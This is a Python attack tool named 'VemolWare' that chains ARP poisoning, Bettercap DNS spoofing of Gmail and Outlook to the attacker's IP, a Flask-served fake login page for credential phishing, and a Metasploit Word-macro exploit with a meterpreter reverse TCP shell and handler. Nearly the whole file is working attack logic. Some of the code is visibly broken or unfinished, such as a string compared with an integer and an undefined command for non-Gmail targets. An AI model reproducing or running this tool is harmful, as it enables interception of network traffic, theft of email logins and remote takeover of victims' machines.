import os
import subprocess
import sys
import netifaces
from optparse import OptionParser
from vemol_ware_2 import ARPSpoofing


DOMAIN_TARGET = {
    '1': ['www.gmail.com', 'gmail-login.html'],
    '2': ['www.outlook.com', 'outlook-login.html'],
}

LOCAL_IP = netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr']
GATEWAY_IP = netifaces.gateways()['default'][netifaces.AF_INET][0]


class VemolWare:
    def __init__(self):

        if os.geteuid() != 0:
            print ("[-] Run me as root")
            sys.exit(1)

        # ------------ Main ------------
        usage = 'Usage: %prog [-i interface] [-t target] host/s'
        parser = OptionParser(usage)
        parser.add_option('-i', dest='interface', help='Specify the interface to use')
        parser.add_option('-t', dest='target', help='Comma separated list to hosts to ARP poison')
        (self.options, self.args) = parser.parse_args()
        
        # Check interface input is given
        if self.options.interface == None:
            parser.print_help()
            sys.exit(0)

        # Select target domain
        try:
            print("\nEnter the domain:")
            print("[1] - Gmail.")
            print("[2] - Outlook.")
            print("[3] - Other.\n\n")
            self.option_domain = input("Selected option: ")
            self.option_domain = DOMAIN_TARGET.get(self.option_domain, '')[0]
            if self.option_domain == 3:
                new_domain = input("\n\nEnter your domain: ")
                # TODO: wget para el domain
        except ValueError:
            print("Sorry, I didn't understand that.")
            parser.print_help()
            sys.exit(0)
    
    def create_config_file_bettercap(self):
        file = open('config/config_bettercap.txt','w') 
        # file.write(f'set arp.spoof.targets {self.options.target}\n')
        # file.write('net.probe on\n')
        # file.write('set arp.spoof.internal true\n')
        # file.write('arp.spoof on\n')
        file.write(f'set dns.spoof.address {LOCAL_IP}\n')
        file.write(f'set dns.spoof.domains {self.option_domain}, www.vemol.com\n')
        file.write('set dns.spoof.all true\n')
        file.write('dns.spoof on\n')
        file.close()

    def bettercap(self):
        # Setting up Bettercap
        command = ["bettercap", "--caplet", "config/config_bettercap.txt"]
        with open("log_bettercap.txt", "w") as file:
            subprocess.Popen(command, stdout=file)
    
    def flask_server (self):
        # Starting Flask server targeting domain address
        gmail_template = DOMAIN_TARGET.get('1')[1]
        if 'gmail' in self.option_domain:
            command = ["python3", "app.py", gmail_template]
        with open("log_flask.txt", "w") as file:
            subprocess.Popen(command, stdout=file)
    
    def create_config_file_metasploit(self):
        file = open('config/commands_msf.txt','w')
        file.write(f'use exploit/multi/fileformat/office_word_macro\n')
        file.write(f'set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set lhost {LOCAL_IP}\n')
        file.write(f'run\n')
        file.write(f'use exploit/multi/handler\n')
        file.write(f'set lhost {LOCAL_IP}\n')
        file.write(f'set payload windows/meterpreter/reverse_tcp\n')
        file.write(f'set lhost {LOCAL_IP}\n')
        file.write(f'exploit -j\n')
        file.close()

    def start_metasploit(self):
        # Starting MSFConsole netstat -natp
        self.create_config_file_metasploit()
        command = f'gnome-terminal -- msfconsole -r config/commands_msf.txt'
        os.system(command)
    
    def main(self):
        self.create_config_file_bettercap()
        self.bettercap()
        self.flask_server()
        self.start_metasploit()


if __name__ == "__main__":
    vemol_ware = VemolWare()
    
    arp_spoofing = ARPSpoofing()
    arp_spoofing.main(vemol_ware.options.target)
    vemol_ware.main()



